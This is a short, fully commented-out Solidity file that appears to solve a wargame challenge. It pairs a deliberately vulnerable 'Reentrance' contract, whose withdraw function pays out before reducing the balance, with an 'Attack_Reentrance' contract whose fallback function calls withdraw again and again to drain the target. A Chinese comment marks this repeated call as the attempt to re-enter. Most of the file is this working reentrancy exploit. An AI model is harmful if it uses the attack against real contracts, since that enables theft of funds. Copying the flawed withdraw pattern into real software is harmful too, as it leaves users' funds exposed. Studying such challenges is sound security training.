//// SPDX-License-Identifier: MIT
//pragma solidity ^0.6.12;
////address：0x1296aFd6CB80203042F87592165083EE8cb33082
//import "@openzeppelin/contracts/utils/math/SafeMath.sol";
//
//contract Reentrance {
//
//    using SafeMath for uint256;
//    mapping(address => uint) public balances;
//
//    function donate(address _to) public payable {
//        balances[_to] = balances[_to].add(msg.value);
//    }
//
//    function balanceOf(address _who) public view returns (uint balance) {
//        return balances[_who];
//    }
//
//    function withdraw(uint _amount) public {
//        if (balances[msg.sender] >= _amount) {
//            (bool result,) = msg.sender.call{value: _amount}("");
//            if (result) {
//                _amount;
//            }
//            balances[msg.sender] -= _amount;
//        }
//    }
//
//    receive() external payable {}
//}
//
//contract Attack_Reentrance {
//    Reentrance public targetContract;
//
//    constructor(address payable target_address) public payable {
//        targetContract = Reentrance(target_address);
//        targetContract.donate{value: msg.value}(address(this));
//    }
//
//
//    function targetWithdraw() public {
//        // 调用目标合约的 withdraw 函数，尝试重入
//        targetContract.withdraw(0.001 ether);
//    }
//
//
//    fallback() external payable {
//        targetWithdraw();
//    }
//}